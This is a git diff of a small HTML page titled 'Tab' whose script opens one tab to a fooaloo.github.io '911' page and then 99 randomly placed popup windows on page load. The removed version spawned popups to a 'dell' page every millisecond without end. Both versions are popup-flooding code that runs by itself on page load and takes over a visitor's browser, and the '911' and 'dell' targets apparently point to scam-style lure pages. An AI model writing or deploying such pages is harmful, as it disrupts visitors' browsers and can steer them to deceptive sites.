@@ -1,22 +1,35 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Window Spawner</title>
+  <title>Tab</title>
   <script>
-    let counter = 0;
+    const Target_URL = 'https://fooaloo.github.io/911/'
+    const TARGET_URL = 'https://example.com'; // Change to your desired link
 
-    function openWindowsFast() {
-      setInterval(() => {
-        // Try to spawn windows as rapidly as possible
-        window.open('https://fooaloo.github.io/dell/', '_blank', `width=400,height=300,top=${counter * 20},left=${counter * 20}`);
-        counter++;
-      }, 1); // 1 millisecond interval
+    function randomPos(max) {
+      return Math.floor(Math.random() * max);
     }
 
-    window.onload = openWindowsFast;
+    function openPopups() {
+      // Open one regular tab (no size/position specs)
+      window.open(Target_URL, '_blank');
+
+      // Open the rest as popups
+      for (let i = 0; i < 99; i++) {
+        const left = randomPos(window.screen.availWidth - 400);
+        const top = randomPos(window.screen.availHeight - 300);
+        window.open(
+          TARGET_URL,
+          '_blank',
+          `width=400,height=300,left=${left},top=${top}`
+        );
+      }
+    }
+
+    window.onload = openPopups;
   </script>
 </head>
 <body>
-  <h1>Spawning new windows as fast as the browser allows...</h1>
+  <h1>HH</h1>
 </body>
 </html>
